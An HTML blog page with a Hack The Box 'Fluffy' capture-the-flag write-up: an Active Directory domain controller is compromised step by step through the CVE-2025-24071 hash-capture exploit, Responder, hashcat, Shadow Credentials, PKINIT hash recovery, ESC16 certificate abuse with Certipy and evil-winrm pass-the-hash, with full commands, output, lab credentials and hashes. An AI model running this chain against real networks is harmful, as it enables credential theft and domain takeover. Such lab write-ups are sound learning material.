<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>HTB - Fluffy | Harun Mansor</title>
<meta name="keywords" content="">
<meta name="description" content="Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.
1. Reconnaissance
Below is the list of open ports on the machine.
53 - dns
88 - kerberos
139 - netbios
389 - LDAP 
445 - SMB
464 - kpasswd5?
593 - RPC over HTTP 1.0
636 - ssl/LDAP
3268 - LDAP
3269 - ssl/LDAP 
5985 - HTTP

OS : windows_server_2019 - likely DC 
SMB signing scan just for practice purpose :)">
<meta name="author" content="">
<link rel="canonical" href="https://harunmansor.github.io/Hugo/posts/first/">
<link crossorigin="anonymous" href="/Hugo/assets/css/stylesheet.08f7d74f0ada0f975d29ae436285b61ed7a719d05f350cb888d00341642995a2.css" integrity="sha256-CPfXTwraD5ddKa5DYoW2HtenGdBfNQy4iNADQWQplaI=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://harunmansor.github.io/Hugo/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://harunmansor.github.io/Hugo/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://harunmansor.github.io/Hugo/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://harunmansor.github.io/Hugo/apple-touch-icon.png">
<link rel="mask-icon" href="https://harunmansor.github.io/Hugo/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://harunmansor.github.io/Hugo/posts/first/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://harunmansor.github.io/Hugo/posts/first/">
  <meta property="og:site_name" content="Harun Mansor">
  <meta property="og:title" content="HTB - Fluffy">
  <meta property="og:description" content="Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.
1. Reconnaissance Below is the list of open ports on the machine.
53 - dns 88 - kerberos 139 - netbios 389 - LDAP 445 - SMB 464 - kpasswd5? 593 - RPC over HTTP 1.0 636 - ssl/LDAP 3268 - LDAP 3269 - ssl/LDAP 5985 - HTTP OS : windows_server_2019 - likely DC SMB signing scan just for practice purpose :)">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-09-16T19:15:43+08:00">
    <meta property="article:modified_time" content="2025-09-16T19:15:43+08:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="HTB - Fluffy">
<meta name="twitter:description" content="Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.
1. Reconnaissance
Below is the list of open ports on the machine.
53 - dns
88 - kerberos
139 - netbios
389 - LDAP 
445 - SMB
464 - kpasswd5?
593 - RPC over HTTP 1.0
636 - ssl/LDAP
3268 - LDAP
3269 - ssl/LDAP 
5985 - HTTP

OS : windows_server_2019 - likely DC 
SMB signing scan just for practice purpose :)">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://harunmansor.github.io/Hugo/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HTB - Fluffy",
      "item": "https://harunmansor.github.io/Hugo/posts/first/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HTB - Fluffy",
  "name": "HTB - Fluffy",
  "description": "Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.\n1. Reconnaissance Below is the list of open ports on the machine.\n53 - dns 88 - kerberos 139 - netbios 389 - LDAP 445 - SMB 464 - kpasswd5? 593 - RPC over HTTP 1.0 636 - ssl/LDAP 3268 - LDAP 3269 - ssl/LDAP 5985 - HTTP OS : windows_server_2019 - likely DC SMB signing scan just for practice purpose :)\n",
  "keywords": [
    
  ],
  "articleBody": "Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.\n1. Reconnaissance Below is the list of open ports on the machine.\n53 - dns 88 - kerberos 139 - netbios 389 - LDAP 445 - SMB 464 - kpasswd5? 593 - RPC over HTTP 1.0 636 - ssl/LDAP 3268 - LDAP 3269 - ssl/LDAP 5985 - HTTP OS : windows_server_2019 - likely DC SMB signing scan just for practice purpose :)\nHost script results: | smb2-time: | date: 2025-06-13T10:39:30 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 6h38m07s, deviation: 0s, median: 6h38m07s 1.2 File discovery in file share (SMB) Upgrade_Notice.pdf Everything-1.4.1.1026.x64 directory everything.exe Everything.lng KeePass directory many files‚Ä¶ Upgrade_Notice.pdf would be of use for us later.\n1.3 Bloodhound setup Use the given credentials to populate the Bloodhound interface.\nsudo bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb -ns 10.10.11.69 -c all INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) INFO: Found AD domain: fluffy.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc01.fluffy.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.fluffy.htb INFO: Found 10 users INFO: Found 54 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.fluffy.htb INFO: Done in 00M 13S After running Bloodhound, right click on the compromised user (j.fleischman) and click ‚ÄúAdd to Owned‚Äù.\n2. Lateral Movement In the Upgrade_Notice.pdf, there are several CVEs that are pending to upgrade which one vulnerability stands out :- CVE-2025-24071 - Basically it exploits the trust between Windows Explorer and .library-ms file. Windows Explorer automatically parses .library-ms file to build virtual views. When a .library-ms file containing SMB path is compressed into a ZIP archive, and subsequently decompressed by someone in the network, the victim‚Äôs hash will be captured as it is a part of the NTLM authentication. This means it will not work if NTLM authentication mechanism is not used in the environment.\nThe exploit : https://www.exploit-db.com/exploits/52310\n‚îå‚îÄ‚îÄ(cresp0„âøkali)-[~/Downloads] ‚îî‚îÄ$ python3 52310.py -i 10.10.14.81 -n paylod_fluffy -o ./output_fluffy --keep [*] Generating malicious .library-ms file... [+] Created ZIP: output_fluffy/paylod_fluffy.zip [!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server. Setup responder and upload the zip file to the SMB server\nResponder activated :\nsudo responder -I tun0 -wvF [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.10.11.69 [SMB] NTLMv2-SSP Username : FLUFFY\\p.agila [SMB] NTLMv2-SSP Hash : p.agila::FLUFFY:d6ac7023016da127:669DD697220ABD56148B54E9315FFD51:0101000000000000006FA0AFD5E2DB01ABF46FB9B154CC660000000002000800470048005200560001001E00570049004E002D004600490050004B005A0049004E0052004F005700340004003400570049004E002D004600490050004B005A0049004E0052004F00570034002E0047004800520056002E004C004F00430041004C000300140047004800520056002E004C004F00430041004C000500140047004800520056002E004C004F00430041004C0007000800006FA0AFD5E2DB010600040002000000080030003000000000000000010000000020000006FBC23B1452E8355F3AB8E58313B291D4334F0AE503E096F6C624A214C100820A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000 smb: \\\u003e put paylod_fluffy.zip putting file paylod_fluffy.zip as \\paylod_fluffy.zip (2.5 kb/s) (average 2.5 kb/s) smb: \\\u003e ls . D 0 Sun Jun 22 00:55:02 2025 .. D 0 Sun Jun 22 00:55:02 2025 Everything-1.4.1.1026.x64 D 0 Fri Apr 18 16:08:44 2025 Everything-1.4.1.1026.x64.zip A 1827464 Fri Apr 18 16:04:05 2025 KeePass-2.58 D 0 Fri Apr 18 16:08:38 2025 KeePass-2.58.zip A 3225346 Fri Apr 18 16:03:17 2025 paylod_fluffy.zip A 334 Sun Jun 22 00:55:02 2025 Upgrade_Notice.pdf A 169963 Sat May 17 15:31:07 2025 5842943 blocks of size 4096. 2253114 blocks available smb: \\\u003e We have caught p.agila hash as she is the victim of the vulnerability. Put the hash in a file and attempt to crack it using hashcat.\nhashcat -m 5600 -a 0 p.agilahash.txt /usr/share/wordlists/rockyou.txt New creds would be obtained p.agila:prometheusx-303. As we have acquired a new user, re-run the below command for the new user in order for Bloodhound to be updated. Upload the command outputs to the Bloodhound web interface.\nbloodhound-python -u p.agila -p \"prometheusx-303\" -d fluffy.htb -ns 10.10.11.69 -c all As we can see in the imgae below, p.agila is a member of the Service Account Managers security group. This should be kept in mind. Click outbound object control. We would see that p.agila is a member of Service Account Managers group that has GenericAll perm on the Service Accounts group which has the GenericWrite perm on its members (ca_svc, ldap_svc and winrm_svc). For the GenericAll, it means Service Account Managers group members can add any users (modify group membership) into group Service Accounts.\nüí° Tip: GenericAll over a group - Full control of a group allows you to directly modify group membership of the group. For full abuse info in that scenario, see the Abuse Info section under the AddMembers edge.\nüí° Tip: GenericWrite over a user - you can write to the ‚Äúmsds-KeyCredentialLink‚Äù attribute. Writing to this property allows an attacker to create ‚ÄúShadowCredentials‚Äù on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge. Alternatively, you can write to the ‚ÄúservicePrincipalNames‚Äù attribute and perform a targeted kerberoasting attack.\n2.1 Adding ourselves to Service Accounts group So right now, we (p.agila) needs to have ‚Äúaccess‚Äù to the user accounts in the Service Accounts group to explore further more. Since p.agila is a member of Service Account Managers group which has GenericAll perm to the Service Accounts group, we can add ourselves to the group to inherit the GenericWrite perm on the service accounts.\nbloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila [+] p.agila added to SERVICE ACCOUNTS run bloodhound again after adding p.agila to Service Accounts Group.\nbloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c all 2.2 Shadow Credentials attack to retrieve winrm_svc hash Now we will create Shadow Credentials on one of the service accounts which is winrm_svc. Use pywhisker.py from here. To understand more about Shadow Credentials attack.. read it here. By doing this attack, we essentially inject a certificate into the account for purposes like persistence, and now we can perform Kerberos PKINIT auth using the cert set by us without knowing its password.\n‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/pywhisker/pywhisker] ‚îî‚îÄ$ python3 pywhisker.py -d fluffy.htb -u \"p.agila\" -p \"prometheusx-303\" --dc-ip 10.10.11.69 --target \"WINRM_SVC\" --action \"list\" [*] Searching for the target account [*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb [*] Listing devices for WINRM_SVC [*] DeviceID: b663af76-788c-8644-cbdd-dfbac495f206 | Creation Time (UTC): 2025-06-22 14:14:53.875462 [*] DeviceID: ac543b34-cf8d-f453-f4ae-e8f7a057783e | Creation Time (UTC): 2025-06-22 10:23:29.426920 [*] DeviceID: ca333e54-1aa1-8cb0-a104-702443c6f555 | Creation Time (UTC): 2025-06-22 19:05:51.584066 ‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/pywhisker/pywhisker] ‚îî‚îÄ$ python3 pywhisker.py -d fluffy.htb -u \"p.agila\" -p \"prometheusx-303\" --dc-ip 10.10.11.69 --target \"WINRM_SVC\" --action \"add\" [*] Searching for the target account [*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 59a9d7f7-4924-035f-62f1-d2ce1f138a6f [*] Updating the msDS-KeyCredentialLink attribute of WINRM_SVC [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u003e PFX with cryptography: Xyys4u8v.pfx [+] PFX exportiert nach: Xyys4u8v.pfx [i] Passwort f√ºr PFX: vJaqhtyr3hMdv3qKYBSK [+] Saved PFX (#PKCS12) certificate \u0026 key at path: Xyys4u8v.pfx [*] Must be used with password: vJaqhtyr3hMdv3qKYBSK [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Run gettgtpkinit.py from https://github.com/dirkjanm/PKINITtools to get the TGT. File saved to winrm_svc.ccache.\nNow, I want you to take a look at the output, where there is a AS-REP encryption key. The tool prints it out because in the next step, the NT hash is retrieved by decrypting the NTLM keys (NT hash-derived keys) from the PAC_CREDENTIAL_INFO returned by the KDC.. using the AS-REP encryption key itself.\n‚îå‚îÄ‚îÄ(root„âøkali)-[/home/cresp0/Desktop/fluffy/PKINITtools] ‚îî‚îÄ# python3 gettgtpkinit.py fluffy.htb/winrm_svc -cert-pfx Xyys4u8v.pfx -pfx-pass vJaqhtyr3hMdv3qKYBSK -dc-ip 10.10.11.69 winrm_svc.ccache 2025-06-23 13:13:01,015 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-06-23 13:13:01,043 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-06-23 13:13:06,282 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-06-23 13:13:06,282 minikerberos INFO 398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e INFO:minikerberos:398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e 2025-06-23 13:13:06,286 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file Run getnthash.py to retrieve the NT hash of winrm_svc. This tool actually does the TGS-REQ process using Kerberos U2U.. when someone tries to access a resource using TGT gotten from the KDC. See the image below :\n‚îå‚îÄ‚îÄ(root„âøkali)-[/home/cresp0/Desktop/fluffy/PKINITtools] ‚îî‚îÄ# python3 getnthash.py -k 398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e fluffy.htb/WINRM_SVC Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash 33bd09dcd697600edf6b3a7af4875767 Use evil-winrm to connect to the account remotely and get the user flag.\n‚îå‚îÄ‚îÄ(root„âøkali)-[/home/cresp0/Desktop/fluffy/PKINITtools] ‚îî‚îÄ# evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 *Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop\u003e ls Directory: C:\\Users\\winrm_svc\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 6/22/2025 9:03 AM 34 user.txt 3 Privilege Escalation 3.1 Shadow Credentials attack to retrieve ca_svc hash We have another potential privilege escalation target: the ca_svc account. Since this account is tied to the Certificate Authority, we could enumerate for Active Directory Certificate Services (ADCS) vulnerabilities using Certipy. To proceed, however, we would need the hash of ca_svc. Given that we hold GenericWrite permissions over the Service Accounts group, we can leverage this to add shadow credentials to ca_svc (similar to what we previously did with winrm_svc) in order to obtain its hash.\nUse pywhisker.py to add the shadow credentials to ca_svc\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/pywhisker/pywhisker] ‚îî‚îÄ$ python3 pywhisker.py -d fluffy.htb -u \"p.agila\" -p \"prometheusx-303\" --dc-ip 10.10.11.69 --target \"CA_SVC\" --action \"add\" [*] Searching for the target account [*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 9e64f016-c1dd-66ff-c943-d87c4739d8dc [*] Updating the msDS-KeyCredentialLink attribute of CA_SVC [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u003e PFX with cryptography: Um3a3b8O.pfx [+] PFX exportiert nach: Um3a3b8O.pfx [i] Passwort f√ºr PFX: 2VE9C4kLIQE6OzNX4EFw [+] Saved PFX (#PKCS12) certificate \u0026 key at path: Um3a3b8O.pfx [*] Must be used with password: 2VE9C4kLIQE6OzNX4EFw [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools Request TGT using gettgtpkinit.py\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/PKINITtools] ‚îî‚îÄ$ python3 gettgtpkinit.py fluffy.htb/ca_svc -cert-pfx Um3a3b8O.pfx -pfx-pass 2VE9C4kLIQE6OzNX4EFw -dc-ip 10.10.11.69 ca_svc.ccache 2025-06-23 23:53:36,555 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-06-23 23:53:36,581 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-06-23 23:53:41,946 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-06-23 23:53:41,946 minikerberos INFO 828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7 INFO:minikerberos:828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7 2025-06-23 23:53:41,953 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file Set the KRB5CCNAME environment variable and run getnthash.py to retrieve the hash.\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/PKINITtools] ‚îî‚îÄ$ export KRB5CCNAME=$(pwd)/ca_svc.ccache ‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/PKINITtools] ‚îî‚îÄ$ python3 getnthash.py -k 828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7 fluffy.htb/ca_svc /home/cresp0/Desktop/fluffy/PKINITtools/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u003c81. import pkg_resources Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash ca0f4f9e9eb8a092addf53bb03fc98c8 3.2 Exploiting ESC16 Upon retrieving the hash, now we can use Certipy to enumerate for ADCS vulnerabilities.\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/adcs_enum] ‚îî‚îÄ$ certipy find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 14 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP [*] Successfully retrieved CA configuration for 'fluffy-DC01-CA' [*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Saving text output to '20250624000309_Certipy.txt' [*] Wrote text output to '20250624000309_Certipy.txt' [*] Saving JSON output to '20250624000309_Certipy.json' [*] Wrote JSON output to '20250624000309_Certipy.json' Open the output file. It can be seen that the environment is vulnerable to ESC16.\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/adcs_enum] ‚îî‚îÄ$ cat 20250624000309_Certipy.txt Certificate Authorities 0 CA Name : fluffy-DC01-CA DNS Name : DC01.fluffy.htb Certificate Subject : CN=fluffy-DC01-CA, DC=fluffy, DC=htb Certificate Serial Number : 3670C4A715B864BB497F7CD72119B6F5 Certificate Validity Start : 2025-04-17 16:00:16+00:00 Certificate Validity End : 3024-04-17 16:11:16+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Disabled Extensions : 1.3.6.1.4.1.311.25.2 Permissions Owner : FLUFFY.HTB\\Administrators Access Rights ManageCa : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators ManageCertificates : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators Enroll : FLUFFY.HTB\\Cert Publishers [!] Vulnerabilities ESC16 : Security Extension is disabled. [*] Remarks ESC16 : Other prerequisites may be required for this to be exploitable. See the wiki for more details. Certificate Templates : [!] Could not find any certificate templates From the output above, we can see that 1.3.6.1.4.1.311.25.2 is in Disabled Extensions. 1.3.6.1.4.1.311.25.2 is the Object Identifier (OID) of the special extension szOID_NTDS_CA_SECURITY_EXT. Okay, let‚Äôs go to how CA works when the extension is enabled. So when CA issues a certificate, this extension embeds the SID of the AD account that requested the certificate directly into the certificate. But when the extension is disabled, Windows will fall back to using a weak mapping, like mapping the UPN in the cert to an account. Okay that‚Äôs too much talking. The general view is the CA issues a cert to an account while the extension is disabled. So when the user uses the certificate for authentication (certificate-based authentication), the DC will have to check if the cert is the user‚Äôs belonging, so the DC will blindly just check the identifiers inside the cert (like the UPN in the Subject Alternative Name, or sometimes the CN/email). If the SID extension is missing (which it is missing).. the DC can‚Äôt strongly tie the cert back to the exact AD account ‚Äî it only trusts whatever strings are in the cert, which is where the ESC16 risk comes in.\nSo let‚Äôs exploit this. We wanna update the ca_svc UPN to admin so when requesting for a certificate, the generated certificate will have Admin‚Äôs UPN embedded in it. Update the ca_svc UPN to administrator.\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/movejfleischman] ‚îî‚îÄ$ certipy account -u 'p.agila' -p 'prometheusx-303' -target 'fluffy.htb' -upn 'Administrator@fluffy.htb' -user 'ca_svc' update Certipy v5.0.3 - by Oliver Lyak (ly4k) [!] DNS resolution failed: The DNS query name does not exist: fluffy.htb. [!] Use -debug to print a stacktrace [*] Updating user 'ca_svc': userPrincipalName : Administrator@fluffy.htb [*] Successfully updated 'ca_svc' Next, request a certificate using the account ca_svc and its hash retrieved from shadow credential attack. Remember, only the UPN (ca_svc@fluffy.htb) of ca_svc is changed, not its sAMAccountName (ca_svc), thus the command below uses the ‚Äú-u ‚Äòca_svc‚Äô‚Äù.\nThis command will have an output of the Administrator certificate because the CA embeds the ca_svc‚Äôs new UPN to the certificate.\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/movejfleischman] ‚îî‚îÄ$ certipy req -dc-ip '10.10.11.69' -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User' Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Request ID is 16 [*] Successfully requested certificate [*] Got certificate with UPN 'Administrator@fluffy.htb' [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to 'administrator.pfx' [*] Wrote certificate and private key to 'administrator.pfx' Revert back the UPN change.\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/movejfleischman] ‚îî‚îÄ$ certipy account -u 'p.agila' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' -upn '' update Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Updating user 'ca_svc': userPrincipalName : *DELETED* [*] Successfully updated 'ca_svc' Perform authentication (certificate-based) using the administrator cert, Certipy will get the hash for you.\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/movejfleischman] ‚îî‚îÄ$ certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69 Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: 'Administrator@fluffy.htb' [*] Using principal: 'administrator@fluffy.htb' [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to 'administrator.ccache' [*] Wrote credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Lastly, use evil-winrm to log in using Admin credentials\n‚îå‚îÄ‚îÄ(venv)‚îÄ(cresp0„âøkali)-[~/Desktop/fluffy/movejfleischman] ‚îî‚îÄ$ evil-winrm -i 10.10.11.69 -u 'Administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e' *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e ls Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 6/23/2025 4:33 PM 34 root.txt Resources CVE-2025-24071 - https://cti.monster/blog/2025/03/18/CVE-2025-24071.html CVE-2025-24071 exploit - https://www.exploit-db.com/exploits/52310 PKINIT exploitation tools - https://github.com/dirkjanm/PKINITtools Pywhisker - https://github.com/ShutdownRepo/pywhisker Shadow Credentials - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab Shadow Credentials - https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/ ",
  "wordCount" : "2656",
  "inLanguage": "en",
  "datePublished": "2025-09-16T19:15:43+08:00",
  "dateModified": "2025-09-16T19:15:43+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://harunmansor.github.io/Hugo/posts/first/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Harun Mansor",
    "logo": {
      "@type": "ImageObject",
      "url": "https://harunmansor.github.io/Hugo/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://harunmansor.github.io/Hugo/" accesskey="h" title="Harun Mansor (Alt + H)">Harun Mansor</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://harunmansor.github.io/Hugo/aboutme/" title="About me">
                    <span>About me</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://harunmansor.github.io/Hugo/">Home</a>&nbsp;¬ª&nbsp;<a href="https://harunmansor.github.io/Hugo/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      HTB - Fluffy
    </h1>
    <div class="post-meta"><span title='2025-09-16 19:15:43 +0800 +08'>September 16, 2025</span>&nbsp;¬∑&nbsp;13 min

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#1-reconnaissance" aria-label="1. Reconnaissance">1. Reconnaissance</a><ul>
                        
                <li>
                    <a href="#12-file-discovery-in-file-share-smb" aria-label="1.2 File discovery in file share (SMB)">1.2 File discovery in file share (SMB)</a></li>
                <li>
